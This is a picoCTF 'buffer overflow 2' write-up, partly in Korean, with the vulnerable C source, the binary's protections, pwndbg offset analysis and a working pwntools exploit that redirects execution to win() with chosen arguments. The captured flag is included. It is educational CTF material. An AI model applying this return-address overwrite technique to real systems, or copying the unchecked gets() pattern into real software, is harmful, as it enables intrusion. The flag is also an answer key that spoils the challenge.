# [buffer overflow 2](https://play.picoctf.org/practice/challenge/259?category=6&originalEvent=70&page=1)
<br />

**Discription:**
> Control the return address and arguments
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```
<br />

**Binary Protections:**
```yaml
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/buffer_overflow_2/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# Exploitation
문제에서 제공되는 정보 및 취약점을 취합해보면 다음과 같습니다.
```text
1. 32비트 환경
2. win(0xCAFEF00D, 0xF00DF00D) 호출 -> FLAG 출력
3. gets(buf) 호출 -> 버퍼오버플로우 발생
4. Partial RELRO, No canary, No PIE
```
취합된 정보를 토대로 공격 과정을 정리하면, `gets()`는 입력 값의 길이를 검증하지 않기 때문에 스택 버퍼오버플로우가 발생하며, 해당 바이너리에는 canary가 적용되어 있지 않습니다. 따라서 해당 취약점으로 리턴 주소를 win()의 주소로 덮고, 인자를 요구하는 값으로 설정하면 FLAG가 출력될 것입니다.
<br />
<br />

## 1. 오프셋 구하기
```yaml
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```
중복되지 않는 무작위 값을 생성합니다.
```yaml
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> c
Continuing.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
```
무작위 값을 입력하고, `c`를 하여 오류가 발생하도록 합니다.
```yaml
pwndbg> i r eip
eip            0x62616164          0x62616164
```
이후 해당 명령어로 eip에 저장된 값을 확인합니다. eip에 저장된 값은 `0x62616164`이며, 해당 값을 추적하여 버퍼 시작점부터 리턴 주소까지의 오프셋을 알아낼 수 있습니다.
```yaml
pwndbg> cyclic -l 0x62616164
Finding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)
Found at offset 112
```
오프셋은 112 입니다.

> [!NOTE]
> 프로그램 종료 전 RET은 스택 최상단에 있는 복귀 주소(Return address)를 꺼내어 EIP에 넣고 프로그램의 흐름을 호출자(main)로 되돌립니다. 그러나 패턴 문자열로 버퍼 오버플로우를 일으키면, 이 복귀 주소가 패턴 데이터로 덮이게 됩니다. 그 결과 RET은 정상적인 복귀 주소 대신 패턴의 일부를 EIP에 복사하게 되고, 프로그램은 잘못된 주소로 점프하려다 크래시가 발생하게 됩니다. 이때 EIP에 저장된 값이 패턴 문자열의 몇 번째 위치인지 확인하면, 버퍼의 시작점에서 부터 Return Address까지의 정확한 오프셋을 계산할 수 있습니다.
<br />


## 2. `win()`함수 인자의 정확한 오프셋 확인하기

```asm
pwndbg> x/60i win
   0x8049296 <win>:     endbr32
   0x804929a <win+4>:   push   ebp
   0x804929b <win+5>:   mov    ebp,esp
   0x804929d <win+7>:   push   ebx
   0x804929e <win+8>:   sub    esp,0x54
...
   0x8049303 <win+109>: push   eax
   0x8049304 <win+110>: call   0x8049100 <fgets@plt>
   0x8049309 <win+115>: add    esp,0x10
=> 0x804930c <win+118>: cmp    DWORD PTR [ebp+0x8],0xcafef00d
   0x8049313 <win+125>: jne    0x804932f <win+153>
   0x8049315 <win+127>: cmp    DWORD PTR [ebp+0xc],0xf00df00d
   0x804931c <win+134>: jne    0x8049332 <win+156>
...
```
위 결과로 첫 번째 인자는 `ebp + 0x8`에 위치하고, 두 번째 인자는 `ebp + 0xc`에 위치하는 것을 알 수 있습니다. 분석한 정보를 가지고 공격 코드를 작성할 수 있습니다.

```python
from pwn import *

p = process("./vuln")
# p = remote("saturn.picoctf.net", 55191)

pay = b"A"*112
pay += p32(0x8049296)  # win addr
pay += b"A"*4
pay += p32(0xCAFEF00D) # arg1 (ebp + 0x8)
pay += p32(0xF00DF00D) # arg2 (ebp + 0xc)

p.send(pay)
p.interactive()
```
<br />

# FLAG
```bash
$ python3 test.py
[+] Opening connection to saturn.picoctf.net on port 55191: Done
[*] Switching to interactive mode
Please enter your string:
$
\xf0\xfe\xcaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08AAAA
picoCTF{argum3nt5_4_d4yZ_3c04eab0}[*] Got EOF while reading in interactive
$
```
